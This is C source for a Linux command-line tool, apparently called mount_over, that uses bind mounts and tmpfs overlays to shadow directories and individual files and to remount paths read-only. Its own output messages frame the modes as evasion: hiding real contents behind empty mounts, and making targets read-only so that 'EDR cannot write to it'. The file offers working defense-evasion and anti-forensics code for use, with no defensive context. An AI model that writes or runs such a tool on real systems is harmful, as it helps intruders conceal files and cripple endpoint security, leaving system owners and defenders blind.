#define _GNU_SOURCE
#include <sys/mount.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static void cmd_bind(const char *src, const char *dst)
{
    if (mount(src, dst, NULL, MS_BIND | MS_REC, NULL) < 0) {
        perror("mount --bind"); return;
    }
    printf("[+] bind-mounted '%s' over '%s'\n", src, dst);
    printf("[*] reads/writes to '%s' now go to '%s'\n", dst, src);
}

static void cmd_tmpfs(const char *dst, const char *size_opt)
{
    char opts[64] = "size=10m,mode=755";
    if (size_opt) snprintf(opts, sizeof(opts), "size=%s,mode=755", size_opt);

    if (mount("tmpfs", dst, "tmpfs", 0, opts) < 0) {
        perror("mount tmpfs"); return;
    }
    printf("[+] tmpfs mounted over '%s' (size=%s)\n", dst, size_opt ? size_opt : "10m");
    printf("[*] '%s' now shows an empty writable tmpfs - real contents hidden\n", dst);
}

static void cmd_ro(const char *target)
{
    if (mount(target, target, NULL, MS_BIND, NULL) < 0) {
        perror("bind self"); return;
    }
    if (mount(NULL, target, NULL, MS_BIND | MS_REMOUNT | MS_RDONLY, NULL) < 0) {
        perror("remount ro"); return;
    }
    printf("[+] '%s' remounted read-only (EDR cannot write to it)\n", target);
}

static void cmd_umount(const char *dst)
{
    if (umount2(dst, MNT_DETACH) < 0) { perror("umount2"); return; }
    printf("[+] unmounted '%s' - original contents restored\n", dst);
}

static void cmd_list(const char *path)
{
    FILE *f = fopen("/proc/mounts", "r");
    if (!f) { perror("/proc/mounts"); return; }

    char line[512];
    printf("[*] mounts%s%s:\n", path ? " under " : "", path ? path : "");
    while (fgets(line, sizeof(line), f)) {
        char dev[256], mp[256], fstype[32];
        if (sscanf(line, "%255s %255s %31s", dev, mp, fstype) < 3) continue;
        if (path && strncmp(mp, path, strlen(path)) != 0) continue;
        printf("  %-20s  %-30s  %s\n", dev, mp, fstype);
    }
    fclose(f);
}

static void cmd_hide_file(const char *file)
{
    char dir[512], base[512];
    strncpy(dir, file, sizeof(dir)-1); dir[sizeof(dir)-1] = '\0';
    char *slash = strrchr(dir, '/');
    if (!slash) { snprintf(dir, sizeof(dir), "."); strncpy(base, file, sizeof(base)-1); }
    else { *slash = '\0'; strncpy(base, slash+1, sizeof(base)-1); }
    base[sizeof(base)-1] = '\0';

    char tmpdir[256];
    snprintf(tmpdir, sizeof(tmpdir), "/tmp/.mhide-XXXXXX");
    if (!mkdtemp(tmpdir)) { perror("mkdtemp"); return; }

    char fake_dir[1024];
    snprintf(fake_dir, sizeof(fake_dir), "%s/%.*s", tmpdir, 511, base);

    struct stat st;
    if (stat(file, &st) == 0 && S_ISREG(st.st_mode)) {
        FILE *f = fopen(fake_dir, "w");
        if (f) fclose(f);
    }

    if (mount(fake_dir, file, NULL, MS_BIND, NULL) < 0) {
        perror("mount --bind file"); return;
    }
    printf("[+] '%s' is now hidden (shadowed by empty file from %s)\n", file, tmpdir);
    printf("[*] to restore: %s umount '%s'\n", "mount_over", file);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <bind|tmpfs|ro|umount|list|hide>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "bind") == 0 && argc >= 4) cmd_bind(argv[2], argv[3]);
    else if (strcmp(argv[1], "tmpfs") == 0 && argc >= 3)
        cmd_tmpfs(argv[2], argc >= 4 ? argv[3] : NULL);
    else if (strcmp(argv[1], "ro") == 0 && argc >= 3) cmd_ro(argv[2]);
    else if (strcmp(argv[1], "umount") == 0 && argc >= 3) cmd_umount(argv[2]);
    else if (strcmp(argv[1], "list") == 0) cmd_list(argc >= 3 ? argv[2] : NULL);
    else if (strcmp(argv[1], "hide") == 0 && argc >= 3) cmd_hide_file(argv[2]);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
